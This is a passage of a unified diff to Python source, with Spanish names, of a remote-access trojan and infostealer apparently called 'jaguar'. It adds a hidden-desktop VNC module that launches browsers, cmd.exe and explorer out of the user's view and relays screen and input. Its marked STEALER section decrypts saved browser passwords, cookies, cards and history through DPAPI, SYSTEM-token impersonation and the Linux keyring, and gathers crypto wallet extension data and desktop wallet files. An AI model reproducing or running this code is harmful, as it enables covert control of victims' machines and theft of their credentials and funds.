-    pid, hproc = _hvnc_crear(exe, linea, DESKTOP_NAME)
+def _hvnc_lanzar_win(nav, url=None):
+    exe = _ruta_navegador(nav)
+    if not exe or not os.path.isfile(exe):
+        raise FileNotFoundError(f"navegador no encontrado: {nav}")
+    perfil = _HVNC.get("perfil")
+    if not perfil or not os.path.isdir(perfil):
+        perfil = tempfile.mkdtemp(prefix="jaguar_hvnc_")
+        _HVNC["perfil"] = perfil
+    es_ff = "firefox" in os.path.basename(exe).lower()
+    if es_ff:
+        partes = [f'"{exe}"', "-no-remote", "-profile", f'"{perfil}"',
+                  "-width", "1280", "-height", "800"]
+    else:
+        partes = [f'"{exe}"', f"--user-data-dir={perfil}",
+                  "--window-size=1280,800", "--window-position=0,0",
+                  "--no-default-browser-check", _FLAGS_CHROMIUM]
+    if url:
+        partes.append(f'"{url}"')
+    pid, hproc = _hvnc_crear(exe, " ".join(partes), DESKTOP_NAME)
     _log("HVNC", f"lanzado pid={pid} exe={exe}")
-    _HVNC_PIDS.append(pid)                      # <-- NUEVO
+    if pid not in _HVNC_PIDS:
+        _HVNC_PIDS.append(pid)
     if _k32.WaitForSingleObject(hproc, 1500) == 0:
-        ...
+        codigo = wintypes.DWORD(0)
+        _k32.GetExitCodeProcess(hproc, ctypes.byref(codigo))
+        _log("HVNC", f"pid={pid} termino en <1.5s exit={codigo.value}")
+    try:
+        _k32.CloseHandle(hproc)
+    except Exception:
+        pass
     return pid, perfil
 
 
 def _hvnc_buscar_ventana():
-    """Prioriza la ventana del PID lanzado; respaldo por clase. Fix Chrome."""
     hd = _u32.OpenDesktopW(DESKTOP_NAME, 0, False, DESKTOP_ACCESS)
     if not hd:
         return None
@@ -1104,7 +1850,6 @@ def _hvnc_buscar_ventana():
 
 
 def _hvnc_render_widget(hwnd):
-    """HWND interno que realmente pinta/recibe input (Chrome_RenderWidgetHostHWND)."""
     if not hwnd:
         return None
     encontrados = []
@@ -1130,20 +1875,17 @@ def _hvnc_render_widget(hwnd):
 
 
 def _hvnc_activar():
-    """Marca la ventana como activa/focada dentro del desktop oculto."""
-    if _HVNC.get("activado"):
-        return
-    hwnd = _HVNC.get("hwnd")
-    if not hwnd:
+    if _HVNC.get("activado") or not _HVNC.get("hwnd"):
         return
     try:
+        hwnd = _HVNC["hwnd"]
         rw = _HVNC.get("rw") or _hvnc_render_widget(hwnd) or hwnd
         _HVNC["rw"] = rw
-        _u32.PostMessageW(hwnd, 0x0006, 1, 0)          # WM_ACTIVATE
-        _u32.PostMessageW(hwnd, 0x0007, rw, 0)         # WM_SETFOCUS
+        _u32.PostMessageW(hwnd, 0x0006, 1, 0)
+        _u32.PostMessageW(hwnd, 0x0007, rw, 0)
         _u32.PostMessageW(rw, 0x0006, 1, 0)
         _u32.PostMessageW(rw, 0x0007, rw, 0)
-        _u32.PostMessageW(hwnd, 0x000F, 0, 0)          # WM_PAINT
+        _u32.PostMessageW(hwnd, 0x000F, 0, 0)
         _HVNC["activado"] = True
     except Exception:
         pass
@@ -1186,80 +1928,43 @@ def _hvnc_foco():
     return hwnd
 
 
-def _hvnc_iniciar(a):
-    nav = (a.get("navegador") or "chrome").lower()
+def _hvnc_trabajo_win(a):
     hdesk = _hvnc_crear_desktop()
     if not hdesk:
-        return {"error": "no se pudo crear el desktop oculto"}
-    _HVNC.update({"hwnd": None, "rw": None, "navegador": nav, "error": None,
-                  "hash": None, "estado": "arrancando", "activado": False})
-    _HVNC["exe"] = _ruta_navegador(nav)
-    _log("HVNC", f"iniciar nav={nav} exe={_HVNC['exe']} shell={bool(a.get('shell'))}")
-
-    def trabajo():
-        ok = _u32.SetThreadDesktop(hdesk)
-        _log("HVNC", f"SetThreadDesktop={'ok' if ok else 'fallo'}")
-        if a.get("shell"):
-            try:
-                win = os.path.join(os.environ.get("WINDIR", r"C:\Windows"), "explorer.exe")
-                _hvnc_crear(win, '"%s"' % win, DESKTOP_NAME)
-                _log("HVNC", "explorer.exe lanzado")
-            except Exception as e:
-                _log("HVNC", f"explorer fallo: {e}")
-        if a.get("cmd"):
-            try:
-                cmd = os.path.join(os.environ.get("WINDIR", r"C:\Windows"),
-                                   "System32", "cmd.exe")
-                _hvnc_crear(cmd, '"%s" /k cd /d %USERPROFILE%' % cmd, DESKTOP_NAME)
-                _log("HVNC", "cmd.exe lanzado")
-            except Exception as e:
-                _log("HVNC", f"cmd fallo: {e}")
+        _HVNC["estado"] = "error"
+        _HVNC["error"] = "no se pudo crear el desktop oculto"
+        return
+    _u32.SetThreadDesktop(hdesk)
+    if a.get("shell"):
         try:
-            _HVNC["pid"], _HVNC["perfil"] = _hvnc_lanzar(nav)
-        except Exception as e:
-            _HVNC["error"] = str(e)
-            _HVNC["estado"] = "error"
-            _log("HVNC", f"ERROR lanzando: {e}")
-            return
-        for _ in range(75):
-            time.sleep(0.4)
-            h = _hvnc_buscar_ventana()
-            if h:
-                _HVNC["hwnd"] = h
-                _HVNC["rw"] = _hvnc_render_widget(h)
-                _HVNC["estado"] = "activo"
-                _hvnc_activar()
-                _log("HVNC", f"ventana hwnd={h} render={_HVNC['rw']}")
-                return
-        _HVNC["estado"] = "sin_ventana"
-        _log("HVNC", "ventana NO encontrada (mira jaguar.log)")
-
-    threading.Thread(target=trabajo, daemon=True).start()
-    return {"estado": "arrancando", "navegador": nav, "exe": _HVNC["exe"]}
-
-
-def _hvnc_estado(a):
-    return {k: v for k, v in _HVNC.items() if k != "_sd"}
-
-
-def _hvnc_opciones(a):
-    for k in ("calidad", "escala", "fps"):
-        if k in a:
-            try:
-                _HVNC_CFG[k] = float(a[k])
-            except Exception:
-                pass
-    return {"opciones": dict(_HVNC_CFG)}
-
-
-def _hvnc_navegar(a):
-    nav = (a.get("navegador") or _HVNC.get("navegador") or "chrome").lower()
+            win = os.path.join(os.environ.get("WINDIR", r"C:\Windows"), "explorer.exe")
+            _hvnc_crear(win, f'"{win}"', DESKTOP_NAME)
+        except Exception:
+            pass
+    if a.get("cmd"):
+        try:
+            cmd = os.path.join(os.environ.get("WINDIR", r"C:\Windows"), "System32",
+                               "cmd.exe")
+            _hvnc_crear(cmd, f'"{cmd}" /k cd /d %USERPROFILE%', DESKTOP_NAME)
+        except Exception:
+            pass
     try:
-        _hvnc_lanzar(nav, a.get("url", ""))
-        return {"estado": "navegando"}
+        _HVNC["pid"], _HVNC["perfil"] = _hvnc_lanzar_win(_HVNC["navegador"])
     except Exception as e:
-        _log("HVNC", f"ERROR navegar: {e}")
-        return {"error": str(e)}
+        _HVNC["error"] = str(e)
+        _HVNC["estado"] = "error"
+        _log("HVNC", f"ERROR lanzando: {e}")
+        return
+    for _ in range(75):
+        time.sleep(0.4)
+        h = _hvnc_buscar_ventana()
+        if h:
+            _HVNC["hwnd"] = h
+            _HVNC["rw"] = _hvnc_render_widget(h)
+            _HVNC["estado"] = "activo"
+            _hvnc_activar()
+            return
+    _HVNC["estado"] = "sin_ventana"
 
 
 def _gdi_liberar():
@@ -1295,7 +2000,7 @@ def _es_negro(datos, paso=8192):
         return False
 
 
-def _hvnc_captura(a):
+def _hvnc_captura_win(a):
     hwnd = _HVNC.get("hwnd") or _hvnc_buscar_ventana()
     if not hwnd or not _u32.IsWindow(hwnd):
         return {"w": 1, "h": 1, "b64": ""}
@@ -1307,7 +2012,6 @@ def _hvnc_captura(a):
     w, h = r.right - r.left, r.bottom - r.top
     if w <= 0 or h <= 0:
         return {"w": 1, "h": 1, "b64": ""}
-
     hdc = _u32.GetWindowDC(hwnd)
     datos = b""
     try:
@@ -1336,7 +2040,6 @@ def _hvnc_captura(a):
             datos = bytes(buf.raw)
     finally:
         _u32.ReleaseDC(hwnd, hdc)
-
     calidad = int(_HVNC_CFG.get("calidad", 55))
     escala = float(_HVNC_CFG.get("escala", 0.75)) or 1.0
     raw = b""
@@ -1360,7 +2063,6 @@ def _hvnc_captura(a):
             raw = bio.getvalue()
         except Exception:
             raw = b""
-
     if not raw:
         return {"w": w, "h": h, "b64": ""}
     huella = hashlib.md5(raw).digest()
@@ -1370,7 +2072,7 @@ def _hvnc_captura(a):
     return {"w": w, "h": h, "b64": base64.b64encode(raw).decode()}
 
 
-def _hvnc_raton(a):
+def _hvnc_raton_win(a):
     hwnd = _HVNC.get("hwnd") or _hvnc_buscar_ventana()
     if not hwnd:
         return {"estado": "sin ventana"}
@@ -1389,7 +2091,7 @@ def _hvnc_raton(a):
     if accion == "move":
         _u32.PostMessageW(objetivo, 0x0200, 0, lp_cli)
     elif accion == "down":
-        _u32.PostMessageW(objetivo, 0x0021, objetivo, 0)   # WM_MOUSEACTIVATE
+        _u32.PostMessageW(objetivo, 0x0021, objetivo, 0)
         _u32.PostMessageW(objetivo, 0x0201, 1, lp_cli)
     elif accion == "up":
         _u32.PostMessageW(objetivo, 0x0202, 0, lp_cli)
@@ -1400,11 +2102,12 @@ def _hvnc_raton(a):
     elif accion == "doble":
         _u32.PostMessageW(objetivo, 0x0203, 1, lp_cli)
     elif accion == "scroll":
-        _u32.PostMessageW(objetivo, 0x020A, (int(a.get("delta", 120)) & 0xFFFF) << 16, lp_scr)
+        _u32.PostMessageW(objetivo, 0x020A,
+                          (int(a.get("delta", 120)) & 0xFFFF) << 16, lp_scr)
     return {"estado": accion}
 
 
-def _hvnc_teclado(a):
+def _hvnc_teclado_win(a):
     objetivo = _hvnc_foco() or _HVNC.get("rw") or _HVNC.get("hwnd")
     if not objetivo:
         return {"estado": "sin ventana"}
@@ -1419,26 +2122,12 @@ def _hvnc_teclado(a):
         for ch in a["texto"]:
             _u32.PostMessageW(objetivo, 0x0102, ord(ch), 0)
     return {"estado": "ok"}
-# --- HVNC: registro de PID para cerrar SOLO el navegador oculto ---
-_HVNC_PID = {}
 
 
-
-
-def _matar_pid(pid):
-    try:
-        subprocess.run(["taskkill", "/PID", str(pid), "/T", "/F"],
-                       capture_output=True, text=True, **_sin_consola())
-    except Exception:
-        pass   
-
-
-def _hvnc_cerrar(a):
-    """Cierra SOLO los navegadores lanzados por el HVNC (por PID, nunca por nombre)."""
+def _hvnc_cerrar_win():
     pids = list(_HVNC_PIDS)
     if _HVNC.get("pid") and _HVNC["pid"] not in pids:
         pids.append(_HVNC["pid"])
-
     for p in pids:
         try:
             subprocess.run(["taskkill", "/PID", str(p), "/T", "/F"],
@@ -1446,41 +2135,166 @@ def _hvnc_cerrar(a):
         except Exception:
             pass
     _HVNC_PIDS.clear()
-
-    _STREAM["hvnc"]["on"] = False
     _gdi_liberar()
-    _HVNC["pid"] = None
-
     hwnd = _HVNC.get("hwnd")
     try:
         if hwnd and _u32.IsWindow(hwnd):
-            _u32.PostMessageW(hwnd, 0x0010, 0, 0)      # WM_CLOSE
+            _u32.PostMessageW(hwnd, 0x0010, 0, 0)
     except Exception:
         pass
-    _HVNC["hwnd"] = None
-    _HVNC["rw"] = None
-    _HVNC["activado"] = False
 
+
+# -------------------------------- HVNC Linux -------------------------------
+def _hvnc_trabajo_linux(a):
+    exe = _HVNC["exe"]
+    perfil = _HVNC.get("perfil")
+    if not perfil or not os.path.isdir(perfil):
+        perfil = tempfile.mkdtemp(prefix="jaguar_hvnc_")
+        _HVNC["perfil"] = perfil
+    es_ff = "firefox" in os.path.basename(exe).lower()
+    if es_ff:
+        partes = [exe, "-no-remote", "-profile", perfil,
+                  "-width", "1280", "-height", "800"]
+    else:
+        partes = [exe, f"--user-data-dir={perfil}", "--window-size=1280,800",
+                  "--no-first-run", "--no-default-browser-check",
+                  "--disable-features=CalculateNativeWinOcclusion"]
+    if a.get("url"):
+        partes.append(a["url"])
+    try:
+        p = subprocess.Popen(partes, stdout=subprocess.DEVNULL,
+                             stderr=subprocess.DEVNULL)
+        _HVNC["pid"] = p.pid
+        _HVNC_PIDS.append(p.pid)
+        _HVNC["estado"] = "activo"
+    except Exception as e:
+        _HVNC["error"] = str(e)
+        _HVNC["estado"] = "error"
+        return
+    time.sleep(3)
+    if _tiene("xdotool"):
+        for _ in range(20):
+            try:
+                r = subprocess.run(["xdotool", "search", "--onlyvisible", "--pid",
+                                    str(p.pid)], capture_output=True, text=True,
+                                   timeout=6)
+                ids = [i for i in (r.stdout or "").split() if i.strip()]
+                if ids:
+                    g = subprocess.run(["xdotool", "getwindowgeometry", "--shell",
+                                        ids[-1]], capture_output=True, text=True,
+                                       timeout=6)
+                    vals = dict(l.split("=") for l in g.stdout.splitlines() if "=" in l)
+                    _HVNC["hwnd"] = {"x": int(vals.get("X", 0)),
+                                     "y": int(vals.get("Y", 0)),
+                                     "w": int(vals.get("WIDTH", 0)),
+                                     "h": int(vals.get("HEIGHT", 0))}
+                    return
+            except Exception:
+                pass
+            time.sleep(0.5)
+
+
+def _hvnc_captura_linux(a):
+    cap = _captura({"formato": "jpeg",
+                    "calidad": int(_HVNC_CFG.get("calidad", 55)),
+                    "escala": float(_HVNC_CFG.get("escala", 0.75))})
+    if not cap.get("b64"):
+        return {"w": 1, "h": 1, "b64": ""}
+    geo = _HVNC.get("hwnd")
+    if geo and _tiene("import") and geo.get("w", 0) > 200:
+        destino = os.path.join(tempfile.gettempdir(), "jaguar_hvnc.png")
+        try:
+            subprocess.run(["import", "-window", "root", "-crop",
+                            f"{geo['w']}x{geo['h']}+{geo['x']}+{geo['y']}", destino],
+                           capture_output=True, timeout=15)
+            if os.path.isfile(destino) and os.path.getsize(destino) > 0:
+                with open(destino, "rb") as f:
+                    raw = f.read()
+                return {"w": geo["w"], "h": geo["h"],
+                        "b64": base64.b64encode(raw).decode()}
+        except Exception:
+            pass
+    return cap
+
+
+def _hvnc_cerrar_linux():
+    for p in list(_HVNC_PIDS):
+        try:
+            os.kill(p, 15)
+        except Exception:
+            pass
+    _HVNC_PIDS.clear()
     perfil = _HVNC.get("perfil")
     if perfil:
         shutil.rmtree(perfil, ignore_errors=True)
         _HVNC["perfil"] = None
 
-    _HVNC["hash"] = None
-    _HVNC["estado"] = "idle"
-    try:
-        if _HVNC.get("hdesk"):
-            _u32.CloseDesktop(_HVNC["hdesk"])
-        _HVNC["hdesk"] = None
-    except Exception:
-        pass
+
+# ------------------------------ HVNC dispatch ------------------------------
+def _hvnc_captura(a):
+    if ES_WIN:
+        return _hvnc_captura_win(a)
+    if ES_ANDROID:
+        return _captura_android("jpeg", int(_HVNC_CFG.get("calidad", 55)),
+                                float(_HVNC_CFG.get("escala", 0.75)))
+    return _hvnc_captura_linux(a)
+
+
+def _hvnc_raton(a):
+    if ES_WIN:
+        return _hvnc_raton_win(a)
+    if ES_ANDROID:
+        return _raton_android(a)
+    return _raton_xdo(a)
+
+
+def _hvnc_teclado(a):
+    if ES_WIN:
+        return _hvnc_teclado_win(a)
+    return _teclado(a)
+
+
+def _hvnc_cerrar(a):
+    if ES_WIN:
+        _hvnc_cerrar_win()
+    else:
+        _hvnc_cerrar_linux()
+    _STREAM["hvnc"]["on"] = False
+    _HVNC.update({"pid": None, "hwnd": None, "rw": None, "activado": False,
+                  "hash": None, "estado": "idle", "error": None})
     _log("HVNC", "cerrado")
     return {"estado": "HVNC cerrado"}
 
 
-# ============================== STREAMS PUSH ================================
-_STREAM = {"hvnc": {"on": False, "fps": 10},
-           "escritorio": {"on": False, "fps": 5}}
+def _hvnc_navegar(a):
+    nav = (a.get("navegador") or _HVNC.get("navegador") or "chrome").lower()
+    url = a.get("url", "")
+    try:
+        if ES_WIN:
+            _hvnc_lanzar_win(nav, url)
+        else:
+            exe = _ruta_navegador(nav)
+            perfil = _HVNC.get("perfil") or tempfile.mkdtemp(prefix="jaguar_hvnc_")
+            _HVNC["perfil"] = perfil
+            subprocess.Popen([exe, f"--user-data-dir={perfil}", url],
+                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return {"estado": "navegando"}
+    except Exception as e:
+        return {"error": str(e)}
+
+
+def _hvnc_estado(a):
+    return {k: v for k, v in _HVNC.items() if k != "_sd"}
+
+
+def _hvnc_opciones(a):
+    for k in ("calidad", "escala", "fps"):
+        if k in a:
+            try:
+                _HVNC_CFG[k] = float(a[k])
+            except Exception:
+                pass
+    return {"opciones": dict(_HVNC_CFG)}
 
 
 def _hvnc_stream(a):
@@ -1550,10 +2364,9 @@ def _captura_stream_loop():
             time.sleep(objetivo - dt)
 
 
-# ======================================================================
-#  CRIPTO SIMETRICA EN PYTHON PURO  (AES-256 GCM/CBC + 3DES-CBC)
-#  Necesaria para descifrar navegadores sin depender de 'cryptography'.
-# ======================================================================
+# ===========================================================================
+#  Cripto simetrica pura (AES-256 GCM/CBC + 3DES) + DPAPI
+# ===========================================================================
 _AES_OK = False
 _SB = [0] * 256
 _ISB = [0] * 256
@@ -1720,7 +2533,7 @@ def _aes_gcm_descifrar(clave, nonce, ct_tag):
     return _aes_ctr(prog, j0, ct)
 
 
-# ------------------------------- DES (para 3DES) ----------------------------
+# --------------------------------- DES/3DES --------------------------------
 _DES_IP = [58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4,
            62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8,
            57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3,
@@ -1848,10 +2661,9 @@ def _3des_cbc_descifrar(clave24, iv, datos):
     return bytes(out)
 
 
-# ================================= DPAPI ====================================
 def _dpapi(blob, entropy=None):
-    if not blob:
-        return b""
+    if not blob or not ES_WIN:
+        return blob or b""
     try:
         import ctypes
         from ctypes import wintypes
@@ -1865,11 +2677,10 @@ def _dpapi(blob, entropy=None):
             return _BLOB(len(datos), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char))), buf
 
         bi, _b1 = _mk(blob)
+        pbe = None
         if entropy:
             be, _b2 = _mk(entropy)
             pbe = ctypes.byref(be)
-        else:
-            pbe = None
         bo = _BLOB()
         ok = ctypes.windll.crypt32.CryptUnprotectData(
             ctypes.byref(bi), None, pbe, None, None, 0, ctypes.byref(bo))
@@ -1888,20 +2699,28 @@ def _dpapi(blob, entropy=None):
 
 def _pid_de(nombre):
     try:
-        r = subprocess.run(["tasklist", "/FI", "IMAGENAME eq " + nombre,
-                            "/NH", "/FO", "CSV"],
-                           capture_output=True, text=True, **_sin_consola())
-        for ln in (r.stdout or "").splitlines():
-            partes = [p.strip('"') for p in ln.split('","')]
-            if len(partes) >= 2 and partes[0].lower() == nombre.lower():
-                return int(partes[1])
+        if ES_WIN:
+            r = subprocess.run(["tasklist", "/FI", "IMAGENAME eq " + nombre,
+                                "/NH", "/FO", "CSV"],
+                               capture_output=True, text=True, **_sin_consola())
+            for ln in (r.stdout or "").splitlines():
+                partes = [p.strip('"') for p in ln.split('","')]
+                if len(partes) >= 2 and partes[0].lower() == nombre.lower():
+                    return int(partes[1])
+        else:
+            r = subprocess.run(["pgrep", "-o", nombre.replace(".exe", "")],
+                               capture_output=True, text=True, timeout=8)
+            salida = (r.stdout or "").strip().splitlines()
+            if salida:
+                return int(salida[0])
     except Exception:
         pass
     return None
 
 
 def _como_system(fn):
-    """Ejecuta fn() con el token de SYSTEM (necesario para claves v20 de Chrome)."""
+    if not ES_WIN:
+        return fn()
     try:
         import ctypes
         from ctypes import wintypes
@@ -1938,7 +2757,9 @@ def _como_system(fn):
         return None
 
 
-# ================================= STEALER ==================================
+# ===========================================================================
+#  STEALER
+# ===========================================================================
 DIR_STEAL = os.path.join(DIR_PERSIST, "stealer")
 _STEAL = {"activo": False, "prog": 0, "fase": "idle", "error": None,
           "resumen": None, "zip": None, "auto": False, "url": "",
@@ -2005,22 +2826,27 @@ def _limpiar_temp_steal():
     _TEMP_STEAL = None
 
 
-# --------------------------- navegadores ------------------------------------
 def _rutas_cromo():
-    la = os.environ.get("LOCALAPPDATA", "")
-    ra = os.environ.get("APPDATA", "")
+    if ES_WIN:
+        la = os.environ.get("LOCALAPPDATA", "")
+        ra = os.environ.get("APPDATA", "")
+        return [
+            ("Chrome", os.path.join(la, r"Google\Chrome\User Data")),
+            ("Edge", os.path.join(la, r"Microsoft\Edge\User Data")),
+            ("Brave", os.path.join(la, r"BraveSoftware\Brave-Browser\User Data")),
+            ("Opera", os.path.join(ra, r"Opera Software\Opera Stable")),
+            ("Vivaldi", os.path.join(la, r"Vivaldi\User Data")),
+            ("Chromium", os.path.join(la, r"Chromium\User Data")),
+        ]
+    cfg = os.path.join(_HOME, ".config")
     return [
-        ("Chrome", os.path.join(la, r"Google\Chrome\User Data")),
-        ("Chrome Beta", os.path.join(la, r"Google\Chrome Beta\User Data")),
-        ("Edge", os.path.join(la, r"Microsoft\Edge\User Data")),
-        ("Brave", os.path.join(la, r"BraveSoftware\Brave-Browser\User Data")),
-        ("Opera", os.path.join(ra, r"Opera Software\Opera Stable")),
-        ("Opera GX", os.path.join(ra, r"Opera Software\Opera GX Stable")),
-        ("Vivaldi", os.path.join(la, r"Vivaldi\User Data")),
-        ("Chromium", os.path.join(la, r"Chromium\User Data")),
-        ("Yandex", os.path.join(la, r"Yandex\YandexBrowser\User Data")),
-        ("Avast", os.path.join(la, r"AVAST Software\Browser\User Data")),
-        ("AVG", os.path.join(la, r"AVG\Browser\User Data")),
+        ("Chrome", os.path.join(cfg, "google-chrome")),
+        ("Chrome Beta", os.path.join(cfg, "google-chrome-beta")),
+        ("Chromium", os.path.join(cfg, "chromium")),
+        ("Edge", os.path.join(cfg, "microsoft-edge")),
+        ("Brave", os.path.join(cfg, "BraveSoftware", "Brave-Browser")),
+        ("Vivaldi", os.path.join(cfg, "vivaldi")),
+        ("Opera", os.path.join(cfg, "opera")),
     ]
 
 
@@ -2039,20 +2865,43 @@ def _perfiles_cromo(raiz):
     return out or ["Default"]
 
 
+def _clave_keyring():
+    for cmd in (["secret-tool", "lookup", "application", "chrome"],
+                ["secret-tool", "lookup", "application", "chromium"]):
+        if _tiene(cmd[0]):
+            try:
+                r = subprocess.run(cmd, capture_output=True, timeout=8)
+                if r.returncode == 0 and r.stdout:
+                    return r.stdout
+            except Exception:
+                continue
+    return None
+
+
 def _cromo_clave(raiz):
     try:
         with open(os.path.join(raiz, "Local State"), encoding="utf-8") as f:
             j = json.load(f)
-        b64 = j["os_crypt"]["encrypted_key"]
-        blob = base64.b64decode(b64)
-        if blob[:5] == b"DPAPI":
-            blob = blob[5:]
-        return _dpapi(blob)
+        blob = base64.b64decode(j["os_crypt"]["encrypted_key"])
+        if ES_WIN:
+            if blob[:5] == b"DPAPI":
+                blob = blob[5:]
+            return _dpapi(blob)
+        if blob[:3] == b"v10":
+            blob = blob[3:]
+        kr = _clave_keyring()
+        if kr:
+            pt = _aes_cbc_descifrar(kr, b" " * 16, blob)
+            if pt:
+                return pt[:16]
+        return None
     except Exception:
         return None
 
 
 def _cromo_clave20(raiz):
+    if not ES_WIN:
+        return None
     try:
         with open(os.path.join(raiz, "Local State"), encoding="utf-8") as f:
             j = json.load(f)
@@ -2063,9 +2912,7 @@ def _cromo_clave20(raiz):
         if blob[:4] == b"APPB":
             blob = blob[4:]
         interno = _como_system(lambda: _dpapi(blob))
-        if not interno:
-            return None
-        return _dpapi(interno)
+        return _dpapi(interno) if interno else None
     except Exception:
         return None
 
@@ -2077,8 +2924,12 @@ def _descifrar_valor(blob, clave, clave20=None):
         blob = blob.encode("latin-1", "ignore")
     try:
         if blob[:3] in (b"v10", b"v11"):
-            return _aes_gcm_descifrar(clave, blob[3:15], blob[15:])
-        if blob[:3] == b"v20":
+            if ES_WIN:
+                return _aes_gcm_descifrar(clave, blob[3:15], blob[15:])
+            k = clave or hashlib.pbkdf2_hmac("sha1", b"peanuts", b"saltysalt",
+                                             1, dklen=16)
+            return _aes_cbc_descifrar(k, b" " * 16, blob[3:])
+        if blob[:3] == b"v20" and ES_WIN:
             pt = _aes_gcm_descifrar(clave20 or clave, blob[3:15], blob[15:])
             return pt[32:] if len(pt) > 32 else pt
     except Exception:
@@ -2106,7 +2957,8 @@ def _col_navegadores(base):
             cont["perfiles"] += 1
 
             filas = _sqlite(os.path.join(pdir, "Login Data"),
-                            "SELECT origin_url, username_value, password_value FROM logins")
+                            "SELECT origin_url, username_value, password_value "
+                            "FROM logins")
             if filas:
                 lineas = []
                 for url, usr, pwd in filas:
@@ -2144,7 +2996,8 @@ def _col_navegadores(base):
                 _escribir(os.path.join(d, "tarjetas.txt"), "\n".join(lineas))
 
             filas = _sqlite(os.path.join(pdir, "History"),
-                            "SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 300")
+                            "SELECT url, title FROM urls ORDER BY last_visit_time "
+                            "DESC LIMIT 300")
             if filas:
                 _escribir(os.path.join(d, "historial.txt"),
                           "\n".join(f"{u}\t{t}" for u, t in filas))
@@ -2213,14 +3066,12 @@ def _ff_clave(pdir):
             con.close()
         if not (g and a11):
             return None
-        salt_global = g[0]
-        hp = hashlib.sha1(salt_global + b"").digest()
+        hp = hashlib.sha1(g[0] + b"").digest()
         items = _der_items(a11[0])
         if len(items) < 3:
             return None
-        e_salt, iv, ct = items[0], items[1], items[2]
-        clave = hashlib.pbkdf2_hmac("sha256", hp, e_salt, 1, 32)
-        dec = _aes_cbc_descifrar(clave, iv, ct)
+        clave = hashlib.pbkdf2_hmac("sha256", hp, items[0], 1, 32)
+        dec = _aes_cbc_descifrar(clave, items[1], items[2])
         if len(dec) < 4:
             return None
         n = int.from_bytes(dec[2:4], "big")
@@ -2233,7 +3084,11 @@ def _ff_clave(pdir):
 
 def _col_firefox(base):
     cont = {"perfiles": 0, "passwords": 0, "cookies": 0, "historial": 0}
-    raiz = os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles")
+    if ES_WIN:
+        raiz = os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox",
+                            "Profiles")
+    else:
+        raiz = os.path.join(_HOME, ".mozilla", "firefox")
     if not os.path.isdir(raiz):
         return cont
     for perfil in os.listdir(raiz):
@@ -2256,11 +3111,9 @@ def _col_firefox(base):
                     items = _der_items(base64.b64decode(enc))
                     if len(items) < 2:
                         continue
-                    iv, ct = items[-2], items[-1]
-                    if len(clave) == 24:
-                        pwd = _3des_cbc_descifrar(clave, iv, ct)
-                    else:
-                        pwd = _aes_cbc_descifrar(clave, iv, ct)
+                    pwd = (_3des_cbc_descifrar(clave, items[-2], items[-1])
+                           if len(clave) == 24
+                           else _aes_cbc_descifrar(clave, items[-2], items[-1]))
                     lineas.append(f"URL: {lg.get('hostname')}\n"
                                   f"Usuario: {lg.get('usernameField', '')}\n"
                                   f"Password: {_texto(pwd)}\n")
@@ -2269,11 +3122,13 @@ def _col_firefox(base):
                     _escribir(os.path.join(d, "passwords.txt"), "\n".join(lineas))
             except Exception:
                 pass
-        for nom, sql, cam in (
-                ("cookies.txt", "SELECT host, name, value FROM moz_cookies", 3),
-                ("historial.txt", "SELECT url, title FROM moz_places LIMIT 300", 2)):
-            filas = _sqlite(os.path.join(pdir, "cookies.sqlite" if "cookie" in nom
-                                         else "places.sqlite"), sql)
+        for nom, sql, archivo in (("cookies.txt",
+                                   "SELECT host, name, value FROM moz_cookies",
+                                   "cookies.sqlite"),
+                                  ("historial.txt",
+                                   "SELECT url, title FROM moz_places LIMIT 300",
+                                   "places.sqlite")):
+            filas = _sqlite(os.path.join(pdir, archivo), sql)
             if filas:
                 _escribir(os.path.join(d, nom),
                           "\n".join("\t".join(str(x) for x in fila) for fila in filas))
@@ -2281,25 +3136,19 @@ def _col_firefox(base):
     return cont
 
 
-# ------------------------------ wallets -------------------------------------
 _IDS_EXT = {
     "nkbihfbeogaeaoehlefnkodbefgpgknn": "MetaMask",
     "fhbohimaelbohpjbbldcngcnapndodjp": "Binance",
     "bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
     "hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase",
     "ibnejdfjmmkpcnlpebgbjaanbjbbbabb": "TronLink",
-    "ffnbelfdoeiohenkjibnmadjiehjhajb": "Yoroi",
     "dmkamcknogkgcdfhhbddcghachkejeap": "Keplr",
-    "aholpfdialjgjfhomihjawabnklbfce": "Terra",
-    "fhmfendgdocmcbmfikdcogofphimnkno": "Sollet",
     "mcohilncbfahbmgdjkbpemcciiolgcge": "OKX",
 }
 
 
 def _col_wallets(base):
     cont = {"extensiones": 0, "escritorio": 0}
-    la = os.environ.get("LOCALAPPDATA", "")
-    ra = os.environ.get("APPDATA", "")
     perfiles = []
     for _, raiz in _rutas_cromo():
         if os.path.isdir(raiz):
@@ -2319,18 +3168,26 @@ def _col_wallets(base):
                 except Exception:
                     pass
 
-    escritorio = {
-        "Exodus": os.path.join(ra, r"Exodus\exodus.wallet"),
-        "Electrum": os.path.join(ra, r"Electrum\wallets"),
-        "Ethereum": os.path.join(ra, r"Ethereum\keystore"),
-        "Atomic": os.path.join(ra, r"atomic\Local Storage\leveldb"),
-        "Coinomi": os.path.join(ra, r"Coinomi\Coinomi\wallets"),
-        "Binance": os.path.join(ra, r"Binance"),
-        "TronLink": os.path.join(ra, r"TronLink"),
-        "Monero": os.path.join(os.path.expanduser("~"), "Monero", "wallets"),
-        "Guarda": os.path.join(ra, r"Guarda"),
-        "Zcash": os.path.join(ra, r"Zcash"),
-    }
+    if ES_WIN:
+        ra = os.environ.get("APPDATA", "")
+        escritorio = {
+            "Exodus": os.path.join(ra, r"Exodus\exodus.wallet"),
+            "Electrum": os.path.join(ra, r"Electrum\wallets"),
+            "Ethereum": os.path.join(ra, r"Ethereum\keystore"),
+            "Atomic": os.path.join(ra, r"atomic\Local Storage\leveldb"),
+            "Coinomi": os.path.join(ra, r"Coinomi\Coinomi\wallets"),
+            "Monero": os.path.join(_HOME, "Monero", "wallets"),
+        }
+    else:
+        escritorio = {
+            "Electrum": os.path.join(_HOME, ".electrum", "wallets"),
